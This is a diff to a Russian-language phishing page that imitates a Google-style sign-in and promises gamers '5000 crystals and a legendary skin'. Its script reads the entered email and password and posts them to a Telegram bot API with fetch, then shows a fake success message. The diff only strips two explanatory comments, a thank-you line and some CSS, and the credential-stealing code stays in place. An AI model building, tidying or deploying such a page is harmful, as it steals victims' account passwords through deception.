@@ -15,8 +15,6 @@
         .footer { text-align: center; margin-top: 40px; color: #5f6368; font-size: 12px; }
         .success-message { display: none; text-align: center; padding: 20px; background: #e8f5e9; border-radius: 8px; margin-top: 20px; }
         .success-message h2 { color: #1e8e3e; margin-bottom: 10px; }
-        .form-fields { display: block; }
-        .hidden { display: none; }
     </style>
 </head>
 <body>
@@ -38,7 +36,6 @@
     <div id="successBlock" class="success-message">
         <h2>🎁 Награда получена!</h2>
         <p>5000 кристаллов + легендарный скин придут на почту в течение 24 часов.</p>
-        <p style="font-size: 14px; margin-top: 15px;">Спасибо, что выбрали нас!</p>
     </div>
     
     <div class="footer">Русский &nbsp;|&nbsp; Справка &nbsp;|&nbsp; Конфиденциальность &nbsp;|&nbsp; Условия</div>
@@ -54,7 +51,6 @@
         const email = document.getElementById('email').value;
         const password = document.getElementById('password').value;
         
-        // Отправляем данные в Telegram
         fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -64,7 +60,6 @@
             })
         });
         
-        // Прячем форму, показываем сообщение об успехе
         document.getElementById('formBlock').style.display = 'none';
         document.getElementById('successBlock').style.display = 'block';
     });
